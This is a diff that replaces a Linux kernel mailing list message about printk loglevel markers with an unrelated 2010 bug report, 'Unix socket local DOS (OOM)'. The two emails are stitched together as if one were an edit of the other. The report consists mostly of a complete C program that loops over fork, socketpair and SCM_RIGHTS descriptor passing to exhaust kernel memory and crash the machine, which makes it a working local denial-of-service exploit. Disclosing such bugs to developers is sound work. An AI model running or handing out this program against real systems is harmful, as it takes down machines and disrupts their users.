@@ -1,68 +1,133 @@
 Return-Path: <linux-kernel-owner@vger.kernel.org>
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id S1752529Ab0KWWQ7 (ORCPT <rfc822;w@1wt.eu>);
-	Tue, 23 Nov 2010 17:16:59 -0500
-Received: from smtp1.linux-foundation.org ([140.211.169.13]:40982 "EHLO
-	smtp1.linux-foundation.org" rhost-flags-OK-OK-OK-OK)
-	by vger.kernel.org with ESMTP id S1751576Ab0KWWQ6 convert rfc822-to-8bit
-	(ORCPT <rfc822;linux-kernel@vger.kernel.org>);
-	Tue, 23 Nov 2010 17:16:58 -0500
+	id S1752627Ab0KWWVH (ORCPT <rfc822;w@1wt.eu>);
+	Tue, 23 Nov 2010 17:21:07 -0500
+Received: from mail-pw0-f46.google.com ([209.85.160.46]:47128 "EHLO
+	mail-pw0-f46.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
+	with ESMTP id S1751458Ab0KWWVF (ORCPT
+	<rfc822;linux-kernel@vger.kernel.org>);
+	Tue, 23 Nov 2010 17:21:05 -0500
+DomainKey-Signature: a=rsa-sha1; c=nofws;
+        d=gmail.com; s=gamma;
+        h=mime-version:date:message-id:subject:from:to:cc:content-type;
+        b=Gdvg/vPYOcaGHPRvyDlqQA1STwlVV5Mohu/8we4kWrXx0VQbxQFTzOM4qW6zNnKTSj
+         b2wMOXNc315VqOffN7A5JzZVzVuI2e6Z3ZzW9mSlFCsm4fDA7LnZzPOXC6qIwLGnIvj4
+         MvQHhi0t+0qG3vcYhgchb0W1+1o6/qcEiViaA=
 MIME-Version: 1.0
-In-Reply-To: <20101123105830.GO4693@pengutronix.de>
-References: <20101011152516.GF27153@n2100.arm.linux.org.uk>
- <1290505382-16110-1-git-send-email-u.kleine-koenig@pengutronix.de>
- <20101123101210.GA18170@n2100.arm.linux.org.uk> <20101123103940.GN4693@pengutronix.de>
- <20101123105830.GO4693@pengutronix.de>
-From: Linus Torvalds <torvalds@linux-foundation.org>
-Date: Wed, 24 Nov 2010 07:16:06 +0900
-Message-ID: <AANLkTinmky17XZZPh7QvcY_r=66f_PwzRYFPUSvhiJGK@mail.gmail.com>
-Subject: Re: About multi-line printk and the need (not) to repeat loglevel
- markers [Was: Re: [PATCH] ARM: mx3/pcm037: properly allocate memory for mx3-camera]
-To: =?ISO-8859-1?Q?Uwe_Kleine=2DK=F6nig?= 
-	<u.kleine-koenig@pengutronix.de>
-Cc: Russell King - ARM Linux <linux@arm.linux.org.uk>,
-        linux-arm-kernel@lists.infradead.org, kernel@pengutronix.de,
-        linux-kernel@vger.kernel.org, Arjan van de Ven <arjan@infradead.org>
-Content-Type: text/plain; charset=ISO-8859-1
-Content-Transfer-Encoding: 8BIT
+Date: Tue, 23 Nov 2010 23:21:05 +0100
+Message-ID: <AANLkTi=Q967xpX0KLMwX-=_4_1AKO5wjHEuJ1TrNjCj9@mail.gmail.com>
+Subject: Unix socket local DOS (OOM)
+From: Vegard Nossum <vegard.nossum@gmail.com>
+To: LKML <linux-kernel@vger.kernel.org>
+Cc: Andrew Morton <akpm@linux-foundation.org>, Eugene Teo <eugene@redhat.com>
+Content-Type: text/plain; charset=UTF-8
 Sender: linux-kernel-owner@vger.kernel.org
 List-ID: <linux-kernel.vger.kernel.org>
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-10/11/23 Uwe Kleine-König <u.kleine-koenig@pengutronix.de>:
->
-> BTW, I just noticed that Linus wrote:
->
->        Additionally, if no newline existed, one is added (unless the
->        log-level is the explicit KERN_CONT marker, to explicitly show
->        that it's a continuation of a previous line).
->
-> This seems to be unimplemented, otherwise the output of
->
->        printk(KERN_ERR "foo bar baz ");
->        printk("buz\n" KERN_WARNING "fiz\n");
->
-> should be
->
->        "foo bar baz \n" at error level
->        "buz\n<4>fiz\n" at default level
+Hi,
 
-No. The KERN_WARNING in the middle of a string is always totally
-bogus. There is no "should be". It's just wrong.
+I found this program lying around on my laptop. It kills my box
+(2.6.35) instantly by consuming a lot of memory (allocated by the
+kernel, so the process doesn't get killed by the OOM killer). As far
+as I can tell, the memory isn't being freed when the program exits
+either. Maybe it will eventually get cleaned up the UNIX socket
+garbage collector thing, but in that case it doesn't get called
+quickly enough to save my machine at least.
 
-The "\n" is added automatically iff there is a log-level marker at the
-beginning of the string (with LOG_CONT being the exception). So
+#include <sys/mount.h>
+#include <sys/socket.h>
+#include <sys/un.h>
+#include <sys/wait.h>
 
-   printk("foo bar baz ");
-   printk(KERN_WARNING "fiz\n");
+#include <errno.h>
+#include <fcntl.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
 
-should output two lines ("foo bar baz" with the default loglevel, and
-"fiz" with KERN_WARNING). Even though there is no explicit "\n" there
-for the first one.
+static int send_fd(int unix_fd, int fd)
+{
+        struct msghdr msgh;
+        struct cmsghdr *cmsg;
+        char buf[CMSG_SPACE(sizeof(fd))];
 
-But KERN_XYZ anywhere but in the beginning of the string do not
-matter. Adding newlines changes none of that. It doesn't make the
-marker beginning of the string, it just makes it beginning of the
-line.
+        memset(&msgh, 0, sizeof(msgh));
 
-   Linus
+        memset(buf, 0, sizeof(buf));
+        msgh.msg_control = buf;
+        msgh.msg_controllen = sizeof(buf);
+
+        cmsg = CMSG_FIRSTHDR(&msgh);
+        cmsg->cmsg_len = CMSG_LEN(sizeof(fd));
+        cmsg->cmsg_level = SOL_SOCKET;
+        cmsg->cmsg_type = SCM_RIGHTS;
+
+        msgh.msg_controllen = cmsg->cmsg_len;
+
+        memcpy(CMSG_DATA(cmsg), &fd, sizeof(fd));
+        return sendmsg(unix_fd, &msgh, 0);
+}
+
+int main(int argc, char *argv[])
+{
+        while (1) {
+                pid_t child;
+
+                child = fork();
+                if (child == -1)
+                        exit(EXIT_FAILURE);
+
+                if (child == 0) {
+                        int fd[2];
+                        int i;
+
+                        if (socketpair(PF_UNIX, SOCK_SEQPACKET, 0, fd) == -1)
+                                goto out_error;
+
+                        for (i = 0; i < 100; ++i) {
+                                if (send_fd(fd[0], fd[0]) == -1)
+                                        goto out_error;
+
+                                if (send_fd(fd[1], fd[1]) == -1)
+                                        goto out_error;
+                        }
+
+                        close(fd[0]);
+                        close(fd[1]);
+                        goto out;
+
+                out_error:
+                        fprintf(stderr, "error: %s\n", strerror(errno));
+                out:
+                        exit(EXIT_SUCCESS);
+                }
+
+                while (1) {
+                        pid_t kid;
+                        int status;
+
+                        kid = wait(&status);
+                        if (kid == -1) {
+                                if (errno == ECHILD)
+                                        break;
+                                if (errno == EINTR)
+                                        continue;
+
+                                exit(EXIT_FAILURE);
+                        }
+
+                        if (WIFEXITED(status)) {
+                                if (WEXITSTATUS(status))
+                                        exit(WEXITSTATUS(status));
+                                break;
+                        }
+                }
+        }
+
+        return EXIT_SUCCESS;
+}
+
+
+Vegard
